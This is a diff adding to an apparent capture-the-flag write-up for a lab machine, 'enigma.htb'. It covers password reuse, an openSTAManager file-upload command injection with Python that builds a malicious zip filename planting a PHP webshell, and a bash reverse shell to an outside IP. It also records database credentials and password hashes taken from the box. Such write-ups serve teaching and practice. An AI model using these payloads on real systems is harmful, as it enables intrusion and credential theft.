@@ -42,4 +42,71 @@ had a pdf about the details of the new employee.
 
 <img width="804" height="646" alt="Screenshot 2026-06-29 at 17 59 43" src="https://github.com/user-attachments/assets/f55e8792-2e4c-4de9-90a5-a07d971a1db3" />
 
+```creds ::
+username : kevin
+password : Enigma2024!
+```
 
+<img width="710" height="623" alt="Screenshot 2026-07-06 at 12 09 50" src="https://github.com/user-attachments/assets/b10a0408-c33b-40e2-8642-b6e597011400" />
+
+```
+ another user :: sarah
+```
+trying same password on sarah as she sent the mail to kevin which may have same password.
+
+<img width="713" height="401" alt="Screenshot 2026-07-06 at 12 37 30" src="https://github.com/user-attachments/assets/7d33eafc-bc37-4dea-82ea-
+1516189c401a" />
+
+got the creds of admin for ```openSTAmanager``` software.
+```
+creds ::
+URL ::  http://support_001.enigma.htb
+Username :: admin
+Password :: Ne3s4rtars78s
+```
+
+### openSTAManager v2.9.8 - file upload vulnerbility
+
+### cve 2026-69212
+
+file upload vulnerbility where the user can upload a zip file containing .p7m file but the filename can cointain malicious code. basically the file is directly going into the code which make it a part of the code which makes it vulnerble.
+
+https://github.com/devcode-it/openstamanager/security/advisories/GHSA-25fp-8w8p-mx36
+
+creating the zip file 
+```import zipfile
+
+cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
+malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
+```
+
+uploaded the zip file and shell.php is created in the files directory. with parameter "c". that executes the commands.
+
+got reverse shell from the webshell for www-data user.
+
+``` bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.10/8888+0>%261'```
+
+in /var/www/html/openstamanager/config.inc.php 
+```
+Database host: localhost
+Database username: brollin
+Database password: Fri3nds@9099
+Database name: openstamanager
+```
+
+from brollin/zz_users table ::
+
+```
+username  password(hashed)
+admin     $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu   - uncracked
+haris     $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC   - bestfriends
+```
+
+ssh through password is disabled so switch users. -- ``su haris`` 
+
+services running locally 
+
+<img width="693" height="465" alt="Screenshot 2026-07-06 at 13 16 03" src="https://github.com/user-attachments/assets/8c881923-d702-4d94-8bab-b6b7d9692151" />
